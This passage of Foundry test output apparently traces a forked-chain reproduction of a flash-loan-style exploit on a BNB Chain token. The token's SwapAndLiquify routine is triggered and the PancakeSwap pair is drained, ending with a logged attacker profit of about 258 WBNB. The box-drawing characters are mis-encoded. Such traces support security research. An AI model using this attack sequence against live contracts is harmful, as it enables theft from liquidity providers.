    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 379022482224634297580 [3.79e20]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ emit Sync(reserve0: 1239516147623844 [1.239e15], reserve1: 379022482224634297580 [3.79e20])
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ emit Swap(sender: 0x10ED43C718714eb63d5aA57B78B54704E256024E, amount0In: 100000000000000 [1e14], amount1In: 0, amount0Out: 0, amount1Out: 33178549229639860748 [3.317e19], to: 0x10ED43C718714eb63d5aA57B78B54704E256024E)
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Stop] 
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [534] 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c::balanceOf(0x10ED43C718714eb63d5aA57B78B54704E256024E) [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 33178549229639860748 [3.317e19]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [9223] 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c::withdraw(33178549229639860748 [3.317e19])
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [83] 0x10ED43C718714eb63d5aA57B78B54704E256024E::fallback{value: 33178549229639860748}()
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Stop] 
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ emit Withdrawal(src: 0x10ED43C718714eb63d5aA57B78B54704E256024E, wad: 33178549229639860748 [3.317e19])
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Stop] 
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [671] 0x6Fb2020C236BBD5a7DDEb07E14c9298642253333::fallback{value: 33178549229639860748}()
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [55] 0xa0787DaAD6062349f63b7c228CBFd5d8A3dB08F1::fallback{value: 33178549229639860748}() [delegatecall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Stop] 
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Stop] 
    в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [6329] 0x927A100BCB00553138C6CFA22A4d3A8dbe1156D7::fallback{value: 33178549229639860748}()
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [1504] 0x3E5c63644E683549055b9Be8653de26E0B4CD36E::fallback{value: 33178549229639860748}() [delegatecall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ emit SafeReceived(param0: 0x6Fb2020C236BBD5a7DDEb07E14c9298642253333, param1: 33178549229639860748 [3.317e19])
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Stop] 
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 
    в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [275] 0x10ED43C718714eb63d5aA57B78B54704E256024E::WETH() [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c
    в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ emit Approval(owner: 0x6Fb2020C236BBD5a7DDEb07E14c9298642253333, spender: 0x10ED43C718714eb63d5aA57B78B54704E256024E, value: 250000000000000 [2.5e14])
    в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [99942] 0x10ED43C718714eb63d5aA57B78B54704E256024E::swapExactTokensForETHSupportingFeeOnTransferTokens(250000000000000 [2.5e14], 0, [0x6Fb2020C236BBD5a7DDEb07E14c9298642253333, 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c], 0x6Fb2020C236BBD5a7DDEb07E14c9298642253333, 1653831935 [1.653e9])
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [31224] 0x6Fb2020C236BBD5a7DDEb07E14c9298642253333::transferFrom(0x6Fb2020C236BBD5a7DDEb07E14c9298642253333, 0x128cd0Ae1a0aE7e67419111714155E1B1c6B2D8D, 250000000000000 [2.5e14])
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [30472] 0xa0787DaAD6062349f63b7c228CBFd5d8A3dB08F1::transferFrom(0x6Fb2020C236BBD5a7DDEb07E14c9298642253333, 0x128cd0Ae1a0aE7e67419111714155E1B1c6B2D8D, 250000000000000 [2.5e14]) [delegatecall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [1683] 0x5e240610aE24b5E33f0eC75C959d922b1b39A3f1::getLockedAmountByAddress(0x6Fb2020C236BBD5a7DDEb07E14c9298642253333) [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [940] 0x91638e4862Fec7CdFDb5502b4936f0e6335E2DC8::getLockedAmountByAddress(0x6Fb2020C236BBD5a7DDEb07E14c9298642253333) [delegatecall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ emit Transfer(from: 0x6Fb2020C236BBD5a7DDEb07E14c9298642253333, to: 0x128cd0Ae1a0aE7e67419111714155E1B1c6B2D8D, value: 250000000000000 [2.5e14])
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] true
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] true
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [893] 0x128cd0Ae1a0aE7e67419111714155E1B1c6B2D8D::getReserves() [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 1239516147623844 [1.239e15], 379022482224634297580 [3.79e20], 1653831935 [1.653e9]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [2768] 0x6Fb2020C236BBD5a7DDEb07E14c9298642253333::balanceOf(0x128cd0Ae1a0aE7e67419111714155E1B1c6B2D8D) [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [2025] 0xa0787DaAD6062349f63b7c228CBFd5d8A3dB08F1::balanceOf(0x128cd0Ae1a0aE7e67419111714155E1B1c6B2D8D) [delegatecall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 1489516147623844 [1.489e15]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 1489516147623844 [1.489e15]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [40492] 0x128cd0Ae1a0aE7e67419111714155E1B1c6B2D8D::swap(0, 63482633808128162477 [6.348e19], 0x10ED43C718714eb63d5aA57B78B54704E256024E, 0x)
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [23162] 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c::transfer(0x10ED43C718714eb63d5aA57B78B54704E256024E, 63482633808128162477 [6.348e19])
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ emit Transfer(from: 0x128cd0Ae1a0aE7e67419111714155E1B1c6B2D8D, to: 0x10ED43C718714eb63d5aA57B78B54704E256024E, value: 63482633808128162477 [6.348e19])
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] true
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [2768] 0x6Fb2020C236BBD5a7DDEb07E14c9298642253333::balanceOf(0x128cd0Ae1a0aE7e67419111714155E1B1c6B2D8D) [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [2025] 0xa0787DaAD6062349f63b7c228CBFd5d8A3dB08F1::balanceOf(0x128cd0Ae1a0aE7e67419111714155E1B1c6B2D8D) [delegatecall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 1489516147623844 [1.489e15]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 1489516147623844 [1.489e15]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [534] 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c::balanceOf(0x128cd0Ae1a0aE7e67419111714155E1B1c6B2D8D) [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 315539848416506135103 [3.155e20]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ emit Sync(reserve0: 1489516147623844 [1.489e15], reserve1: 315539848416506135103 [3.155e20])
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ emit Swap(sender: 0x10ED43C718714eb63d5aA57B78B54704E256024E, amount0In: 250000000000000 [2.5e14], amount1In: 0, amount0Out: 0, amount1Out: 63482633808128162477 [6.348e19], to: 0x10ED43C718714eb63d5aA57B78B54704E256024E)
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Stop] 
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [534] 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c::balanceOf(0x10ED43C718714eb63d5aA57B78B54704E256024E) [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 63482633808128162477 [6.348e19]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [9223] 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c::withdraw(63482633808128162477 [6.348e19])
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [83] 0x10ED43C718714eb63d5aA57B78B54704E256024E::fallback{value: 63482633808128162477}()
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Stop] 
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ emit Withdrawal(src: 0x10ED43C718714eb63d5aA57B78B54704E256024E, wad: 63482633808128162477 [6.348e19])
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Stop] 
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [671] 0x6Fb2020C236BBD5a7DDEb07E14c9298642253333::fallback{value: 63482633808128162477}()
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [55] 0xa0787DaAD6062349f63b7c228CBFd5d8A3dB08F1::fallback{value: 63482633808128162477}() [delegatecall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Stop] 
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Stop] 
    в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ emit Approval(owner: 0x6Fb2020C236BBD5a7DDEb07E14c9298642253333, spender: 0x10ED43C718714eb63d5aA57B78B54704E256024E, value: 250000000000000 [2.5e14])
    в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [135377] 0x10ED43C718714eb63d5aA57B78B54704E256024E::addLiquidityETH{value: 63482633808128162477}(0x6Fb2020C236BBD5a7DDEb07E14c9298642253333, 250000000000000 [2.5e14], 0, 0, 0x0e0C103fDcd6B16AD9e73DBdAec6410a7aD05Af6, 1653831935 [1.653e9])
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [2676] 0xcA143Ce32Fe78f1f7019d7d551a6402fC5350c73::getPair(0x6Fb2020C236BBD5a7DDEb07E14c9298642253333, 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c) [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 0x128cd0Ae1a0aE7e67419111714155E1B1c6B2D8D
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [893] 0x128cd0Ae1a0aE7e67419111714155E1B1c6B2D8D::getReserves() [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 1489516147623844 [1.489e15], 315539848416506135103 [3.155e20], 1653831935 [1.653e9]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [31224] 0x6Fb2020C236BBD5a7DDEb07E14c9298642253333::transferFrom(0x6Fb2020C236BBD5a7DDEb07E14c9298642253333, 0x128cd0Ae1a0aE7e67419111714155E1B1c6B2D8D, 250000000000000 [2.5e14])
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [30472] 0xa0787DaAD6062349f63b7c228CBFd5d8A3dB08F1::transferFrom(0x6Fb2020C236BBD5a7DDEb07E14c9298642253333, 0x128cd0Ae1a0aE7e67419111714155E1B1c6B2D8D, 250000000000000 [2.5e14]) [delegatecall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [1683] 0x5e240610aE24b5E33f0eC75C959d922b1b39A3f1::getLockedAmountByAddress(0x6Fb2020C236BBD5a7DDEb07E14c9298642253333) [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [940] 0x91638e4862Fec7CdFDb5502b4936f0e6335E2DC8::getLockedAmountByAddress(0x6Fb2020C236BBD5a7DDEb07E14c9298642253333) [delegatecall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ emit Transfer(from: 0x6Fb2020C236BBD5a7DDEb07E14c9298642253333, to: 0x128cd0Ae1a0aE7e67419111714155E1B1c6B2D8D, value: 250000000000000 [2.5e14])
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] true
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] true
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [21974] 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c::deposit{value: 52960125494421832035}()
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ emit Deposit(dst: 0x10ED43C718714eb63d5aA57B78B54704E256024E, wad: 52960125494421832035 [5.296e19])
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Stop] 
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [3262] 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c::transfer(0x128cd0Ae1a0aE7e67419111714155E1B1c6B2D8D, 52960125494421832035 [5.296e19])
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ emit Transfer(from: 0x10ED43C718714eb63d5aA57B78B54704E256024E, to: 0x128cd0Ae1a0aE7e67419111714155E1B1c6B2D8D, value: 52960125494421832035 [5.296e19])
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] true
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [51890] 0x128cd0Ae1a0aE7e67419111714155E1B1c6B2D8D::mint(0x0e0C103fDcd6B16AD9e73DBdAec6410a7aD05Af6)
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [2768] 0x6Fb2020C236BBD5a7DDEb07E14c9298642253333::balanceOf(0x128cd0Ae1a0aE7e67419111714155E1B1c6B2D8D) [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [2025] 0xa0787DaAD6062349f63b7c228CBFd5d8A3dB08F1::balanceOf(0x128cd0Ae1a0aE7e67419111714155E1B1c6B2D8D) [delegatecall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 1739516147623844 [1.739e15]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 1739516147623844 [1.739e15]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [534] 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c::balanceOf(0x128cd0Ae1a0aE7e67419111714155E1B1c6B2D8D) [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 368499973910927967138 [3.684e20]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [2354] 0xcA143Ce32Fe78f1f7019d7d551a6402fC5350c73::feeTo() [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 0x0ED943Ce24BaEBf257488771759F9BF482C39706
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: 0x0e0C103fDcd6B16AD9e73DBdAec6410a7aD05Af6, value: 1130104035739270655 [1.13e18])
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ emit Sync(reserve0: 1739516147623844 [1.739e15], reserve1: 368499973910927967138 [3.684e20])
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ emit Mint(sender: 0x10ED43C718714eb63d5aA57B78B54704E256024E, amount0: 250000000000000 [2.5e14], amount1: 52960125494421832035 [5.296e19])
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 1130104035739270655 [1.13e18]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [671] 0x6Fb2020C236BBD5a7DDEb07E14c9298642253333::fallback{value: 10522508313706330442}()
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [55] 0xa0787DaAD6062349f63b7c228CBFd5d8A3dB08F1::fallback{value: 10522508313706330442}() [delegatecall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Stop] 
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 250000000000000 [2.5e14], 52960125494421832035 [5.296e19], 1130104035739270655 [1.13e18]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ emit SwapAndLiquify(: 250000000000000 [2.5e14], : 63482633808128162477 [6.348e19], : 250000000000000 [2.5e14])
    в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x128cd0Ae1a0aE7e67419111714155E1B1c6B2D8D, value: 4511616639308867 [4.511e15])
    в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] true
    в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] true
    в”‚   в”‚   в”‚   в”њв”Ђ [534] 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 10000000000000000000 [1e19]
    в”‚   в”‚   в”‚   в”њв”Ђ [893] 0x128cd0Ae1a0aE7e67419111714155E1B1c6B2D8D::getReserves() [staticcall]
    в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 1739516147623844 [1.739e15], 368499973910927967138 [3.684e20], 1653831935 [1.653e9]
    в”‚   в”‚   в”‚   в”њв”Ђ [2768] 0x6Fb2020C236BBD5a7DDEb07E14c9298642253333::balanceOf(0x128cd0Ae1a0aE7e67419111714155E1B1c6B2D8D) [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [2025] 0xa0787DaAD6062349f63b7c228CBFd5d8A3dB08F1::balanceOf(0x128cd0Ae1a0aE7e67419111714155E1B1c6B2D8D) [delegatecall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 6251132786932711 [6.251e15]
    в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 6251132786932711 [6.251e15]
    в”‚   в”‚   в”‚   в”њв”Ђ [20592] 0x128cd0Ae1a0aE7e67419111714155E1B1c6B2D8D::swap(0, 265771339366198266632 [2.657e20], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x)
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [3262] 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 265771339366198266632 [2.657e20])
    в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ emit Transfer(from: 0x128cd0Ae1a0aE7e67419111714155E1B1c6B2D8D, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 265771339366198266632 [2.657e20])
    в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] true
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [2768] 0x6Fb2020C236BBD5a7DDEb07E14c9298642253333::balanceOf(0x128cd0Ae1a0aE7e67419111714155E1B1c6B2D8D) [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [2025] 0xa0787DaAD6062349f63b7c228CBFd5d8A3dB08F1::balanceOf(0x128cd0Ae1a0aE7e67419111714155E1B1c6B2D8D) [delegatecall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 6251132786932711 [6.251e15]
    в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 6251132786932711 [6.251e15]
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [534] 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c::balanceOf(0x128cd0Ae1a0aE7e67419111714155E1B1c6B2D8D) [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 102728634544729700506 [1.027e20]
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ emit Sync(reserve0: 6251132786932711 [6.251e15], reserve1: 102728634544729700506 [1.027e20])
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ emit Swap(sender: 0x10ED43C718714eb63d5aA57B78B54704E256024E, amount0In: 4511616639308867 [4.511e15], amount1In: 0, amount0Out: 0, amount1Out: 265771339366198266632 [2.657e20], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
    в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Stop] 
    в”‚   в”‚   в”‚   в”њв”Ђ [534] 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 275771339366198266632 [2.757e20]
    в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Stop] 
    в”‚   в”‚   в”њв”Ђ [534] 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 275771339366198266632 [2.757e20]
    в”‚   в”‚   в”њв”Ђ [3262] 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c::transfer(0xEeBc161437FA948AAb99383142564160c92D2974, 17647200000000000000 [1.764e19])
    в”‚   в”‚   в”‚   в”њв”Ђ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0xEeBc161437FA948AAb99383142564160c92D2974, value: 17647200000000000000 [1.764e19])
    в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] true
    в”‚   в”‚   в””в”Ђ в†ђ [Stop] 
    в”‚   в”њв”Ђ [2642] 0x7864580fb68Ba28B8efF7399dEAEAC5053Ec38A5::balanceOf(0xEeBc161437FA948AAb99383142564160c92D2974) [staticcall]
    в”‚   в”‚   в””в”Ђ в†ђ [Return] 201481591205804787814 [2.014e20]
    в”‚   в”њв”Ђ [534] 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c::balanceOf(0xEeBc161437FA948AAb99383142564160c92D2974) [staticcall]
    в”‚   в”‚   в””в”Ђ в†ђ [Return] 41351737965978097878 [4.135e19]
    в”‚   в”њв”Ђ emit Sync(reserve0: 201481591205804787814 [2.014e20], reserve1: 41351737965978097878 [4.135e19])
    в”‚   в”њв”Ђ emit Swap(sender: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], amount0In: 0, amount1In: 17647200000000000000 [1.764e19], amount0Out: 0, amount1Out: 17200000000000000000 [1.72e19], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
    в”‚   в””в”Ђ в†ђ [Stop] 
    в”њв”Ђ [534] 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    в”‚   в””в”Ђ в†ђ [Return] 258124139366198266632 [2.581e20]
    в”њв”Ђ emit log_named_decimal_uint(key: "[End] After repay, WBNB balance of attacker", val: 258124139366198266632 [2.581e20], decimals: 18)
    в””в”Ђ в†ђ [Stop] 

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 6.60s (6.24s CPU time)

Ran 2 test suites in 6.88s (6.88s CPU time): 2 tests passed, 0 failed, 0 skipped (2 total tests)
